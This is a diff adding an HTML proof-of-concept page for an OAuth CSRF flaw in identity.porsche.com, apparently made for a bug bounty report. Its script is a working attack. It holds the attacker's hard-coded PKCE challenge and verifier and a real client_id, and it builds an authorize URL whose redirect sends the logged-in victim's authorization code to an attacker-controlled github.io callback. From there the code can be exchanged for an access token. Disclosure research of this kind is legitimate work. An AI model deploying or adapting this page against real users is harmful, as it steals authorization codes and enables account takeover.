@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Porsche OAuth CSRF - Live Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 700px;
+            width: 100%;
+            padding: 40px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+        }
+        
+        .warning-box strong {
+            color: #856404;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .warning-box p {
+            color: #856404;
+            margin: 0;
+            font-size: 14px;
+        }
+        
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 20px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .info-box h2 {
+            color: #1976D2;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .info-box p {
+            color: #1565C0;
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+        
+        .info-box code {
+            background: #fff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            color: #d32f2f;
+        }
+        
+        .attack-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+            width: 100%;
+        }
+        
+        .attack-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        
+        .attack-button:active {
+            transform: translateY(0);
+        }
+        
+        .credentials {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .credentials strong {
+            color: #495057;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dee2e6;
+            color: #6c757d;
+            font-size: 14px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Porsche OAuth CSRF Vulnerability</h1>
+        <p class="subtitle">Live Proof of Concept Demonstration</p>
+        
+        <div class="warning-box">
+            <strong>⚠️ Security Research Demonstration</strong>
+            <p>This page demonstrates a CSRF vulnerability in identity.porsche.com's OAuth implementation. When you click below, your authorization code will be captured.</p>
+        </div>
+
+        <div class="info-box">
+            <h2>📋 How This Works</h2>
+            <p><strong>1.</strong> You're logged into Porsche (victim)</p>
+            <p><strong>2.</strong> Click the button below (attacker's malicious link)</p>
+            <p><strong>3.</strong> Your browser sends YOUR cookies with ATTACKER's <code>code_challenge</code></p>
+            <p><strong>4.</strong> Server issues YOUR authorization code (CSRF vulnerability - no state validation!)</p>
+            <p><strong>5.</strong> Code is displayed on the next page</p>
+            <p><strong>6.</strong> Attacker can exchange it for your access token</p>
+        </div>
+
+        <div class="credentials">
+            <strong>Attacker's PKCE Credentials:</strong>
+            Code Challenge: GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8<br>
+            Code Verifier: hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR
+        </div>
+
+        <button id="attackBtn" class="attack-button">🚀 Trigger CSRF Attack</button>
+
+        <div class="footer">
+            <p>Security Research by JobiOne | HackerOne Bug Bounty Program</p>
+            <p>Reported to Porsche via Responsible Disclosure</p>
+        </div>
+    </div>
+
+    <script>
+        // ===================================================================
+        // ATTACKER'S CREDENTIALS
+        // ===================================================================
+        const ATTACKER_CODE_CHALLENGE = 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8';
+        const ATTACKER_REDIRECT = 'https://bradleyjoe80.github.io/porsche-csrf-poc/callback.html';
+        
+        console.log('=== PORSCHE OAUTH CSRF POC ===');
+        console.log('Attacker Code Challenge:', ATTACKER_CODE_CHALLENGE);
+        console.log('Attacker Redirect:', ATTACKER_REDIRECT);
+        
+        // ===================================================================
+        // BUILD MALICIOUS OAUTH URL
+        // ===================================================================
+        document.getElementById('attackBtn').addEventListener('click', function() {
+            console.log('Attack button clicked - redirecting to malicious OAuth URL');
+            
+            // Build OAuth URL with attacker's challenge and redirect
+            const authUrl = 'https://identity.porsche.com/authorize?' +
+                'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB&' +
+                'scope=openid+email+profile&' +
+                'redirect_uri=' + encodeURIComponent(ATTACKER_REDIRECT) + '&' +
+                'audience=https://api.porsche.com&' +
+                'response_type=code&' +
+                'code_challenge=' + ATTACKER_CODE_CHALLENGE + '&' +
+                'code_challenge_method=S256&' +
+                'auth0Client=eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==';
+            
+            console.log('Malicious OAuth URL:', authUrl);
+            console.log('NOTE: No state parameter - this is the CSRF vulnerability!');
+            
+            // Redirect to OAuth endpoint - victim's cookies will be sent automatically
+            window.location.href = authUrl;
+        });
+        
+        console.log('PoC page loaded and ready');
+    </script>
+</body>
+</html>
